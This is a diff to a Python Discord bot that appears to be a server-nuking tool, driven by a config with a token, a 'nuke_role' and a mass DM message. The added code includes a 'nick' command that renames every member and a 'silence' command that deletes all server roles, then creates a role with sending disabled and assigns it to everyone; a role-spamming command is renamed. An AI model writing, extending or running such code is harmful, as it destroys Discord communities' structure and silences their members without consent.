@@ -1,3 +1,4 @@
+from ast import Pass
 from multiprocessing.connection import Client
 import os, datetime, discord, json, sys, asyncio
 from discord import Permissions
@@ -19,8 +20,9 @@ YOUR_NAME =            config["your_name"]
 YOUR_ROLE_NAME =       config["your_role_name"]
 SERVERNAME =           config["servername"]
 DM_MESSAGE =           config["dm_message"]
-#NUKE_ROLE =            config["nuke_role"]
+NUKE_ROLE =            config["nuke_role"]
 ADMIN_ROLE =           config["admin_role"]
+NICK =                 config["nickname"]
 TOKEN =                config["token"]
 if config["prefix_settings"]["use_space"] == True:
     prefix = PREFIX + ' '
@@ -297,7 +299,7 @@ async def admin(ctx): # Gives you a role with admin permissions (can be named in
 
 @client.command()
 @commands.is_owner()
-async def role(ctx,number: int): # Create "input" roles (name given in config.json)
+async def createrole(ctx,number: int): # Create "input" roles (name given in config.json)
     try:
         for i in range(0,number):
             await ctx.guild.create_role(name=YOUR_ROLE_NAME)
@@ -306,6 +308,42 @@ async def role(ctx,number: int): # Create "input" roles (name given in config.js
         print(f"Created {number} roles named {YOUR_ROLE_NAME}")
     except:
         print(f"Couldn't create Roles named {YOUR_ROLE_NAME} for {number} times! Check the Bot Permissions!")
+
+
+@client.command()
+@commands.is_owner()
+async def nick(ctx):
+    for member in ctx.guild.members:
+        try:
+            await member.edit(nick=NICK)
+            print(f"Changed everyone's Nickname to {NICK}!")
+        except:
+            print("Couldn't rename everyone! Check the Bot Permissions!")       
+    await ctx.message.delete()
+
+
+@client.command()
+@commands.is_owner()
+async def silence(ctx):
+    try:
+        for role in ctx.guild.roles:
+            try:
+                await role.delete()
+            except Exception as ex:
+                pass
+        perms = discord.Permissions(send_messages=False, read_messages=True)
+        await ctx.guild.create_role(name=NUKE_ROLE, permissions=perms)
+        print("Deleted all Roles!")
+        await asyncio.sleep(1)
+        print(f"Created Role called {NUKE_ROLE}!")
+        await asyncio.sleep(1)
+        banned_role = discord.utils.get(ctx.guild.roles, name=NUKE_ROLE)
+        for member in ctx.guild.members:
+            await member.add_roles(banned_role)
+            #print(f"Added the Role {NUKE_ROLE} to {member}!")
+    except Exception as ex:
+        print(ex)
+    print(f"Added the Role {NUKE_ROLE} to all members!")
 
 
 client.run(TOKEN)
